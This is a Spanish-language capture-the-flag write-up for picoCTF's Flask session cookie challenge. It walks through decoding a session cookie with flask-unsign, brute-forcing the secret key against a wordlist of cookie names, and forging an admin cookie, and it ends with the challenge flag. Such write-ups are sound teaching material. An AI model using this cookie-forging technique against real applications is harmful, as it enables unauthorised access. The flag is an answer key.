https://play.picoctf.org/practice/challenge/177
## Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/60f76192f6e1fea6f4e6e8c5fc9a6a27/server.py) [http://mercury.picoctf.net:44693/](http://mercury.picoctf.net:44693/)
## Solución
1. Entramos la página y obtenermos una cookie de sesión normal intorduciendo "sugar" en el formulario.
2. La cookie de sesión que nos arroja le realizamos el siguiente procesamiento:
	```
	1. Decodificar:
	flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJzdWdhciJ9.aNmoHg.XFa3fm2vXrv0V5XviQ3kNbbIXxw'   
	
	Res:
	{'very_auth': 'sugar'}
	   
	   
	2. Crear un diccionario de posibles palabras secretas, el código de server.py nos indica que pueden ser las siguientes:
	   
	3. Le realizamos un ataque de fuerza bruta con:
	   flask-unsign --unsign --cookie eyJ2ZXJ5X2F1dGgiOiJzdWdhciJ9.aNmoHg.XFa3fm2vXrv0V5XviQ3kNbbIXxw --wordlist cookiesDictionary.txt
	   
	4. Forjamos la nueva cookie y se la mandamos al server:
	   flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'butter'
	   
	   Res:
	   eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aNmrvg._177_cZT56CBFBnFgWnV3PuMC9Q
	   
	```

3. La flag es: ```picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}```


Dictionary:
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
## Notas adicionales
## Referencias
https://www.youtube.com/watch?v=ufs1xqSQCUM&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=66

